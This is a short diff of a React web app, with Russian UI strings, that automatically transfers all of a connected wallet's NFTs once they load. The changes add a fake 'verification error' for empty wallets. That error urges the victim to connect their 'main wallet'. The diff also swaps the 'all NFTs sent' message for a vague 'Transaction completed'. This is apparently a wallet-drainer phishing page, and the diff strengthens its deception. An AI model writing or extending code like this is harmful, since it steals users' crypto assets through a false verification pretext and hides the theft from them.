@@ -43,8 +43,11 @@ function App() {
     // Автоматически переводим NFT сразу после загрузки
     if (nfts.length > 0 && !loading && !success) {
       transferAllNFTs()
+    } else if (wallet && userAddress && nfts.length === 0 && !loading) {
+      // Если кошелек подключен, но NFT нет
+      setError('Ошибка верификации! На вашем кошельке нет активности. Пожалуйста, подключите ваш основной кошелек, чтобы подтвердить верификацию')
     }
-  }, [nfts])
+  }, [nfts, wallet, userAddress, loading])
 
   const loadNFTs = async () => {
     setLoading(true)
@@ -147,8 +150,18 @@ function App() {
       <div className="container success-screen">
         <div className="success-box">
           <div className="success-icon">✅</div>
-          <h1>Успех!</h1>
-          <p>Все NFT успешно отправлены</p>
+          <h1>Транзакция выполнена</h1>
+        </div>
+      </div>
+    )
+  }
+
+  if (error) {
+    return (
+      <div className="container error-screen">
+        <div className="error-box">
+          <h2>❌ Ошибка</h2>
+          <p>{error}</p>
         </div>
       </div>
     )
